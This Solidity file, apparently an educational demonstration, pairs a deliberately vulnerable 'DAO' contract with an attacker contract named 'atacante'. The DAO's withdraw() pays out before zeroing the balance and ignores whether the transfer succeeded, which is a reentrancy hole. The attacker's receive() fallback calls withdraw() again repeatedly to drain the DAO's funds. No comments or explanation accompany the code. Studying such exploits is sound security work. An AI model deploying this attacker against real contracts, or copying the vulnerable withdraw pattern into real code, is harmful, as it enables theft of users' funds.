// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

contract DAO {

    mapping(address => uint256) public balanceOf;

    constructor() payable {}

    receive() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountToTransfer = balanceOf[msg.sender];
        (bool success, bytes memory data) = payable(msg.sender).call{ value:amountToTransfer }('');
        balanceOf[msg.sender] = 0;
    }

    function getBalance() external view returns(uint256) {
        return address(this).balance;
    }
}

contract atacante {
    DAO public daoContract;
    bytes methodToCall;
    uint256 public count;

    constructor(DAO _daoContract) payable {
        daoContract = _daoContract;
        methodToCall = abi.encodeWithSignature("withdraw()");
    }

    function deposit() external {
        uint256 currentBalance = address(this).balance;
        (bool success, bytes memory data) = payable(daoContract).call{ value:currentBalance }('');
        require(success, "Deposit failed");
    }

    function attackStart() external {
        uint256 daoBalance = daoContract.getBalance();
        if (daoBalance > 0) {
            (bool _success, bytes memory _returnData) = address(daoContract).call{ gas:1000000000 }(methodToCall);
        }
    }

    receive() external payable {
        count++;
        (bool _success, bytes memory _returnData) = address(daoContract).call{ gas:1000000000 }(methodToCall);
    }

    function getBalance() external view returns(uint256) {
        return address(this).balance;
    }
}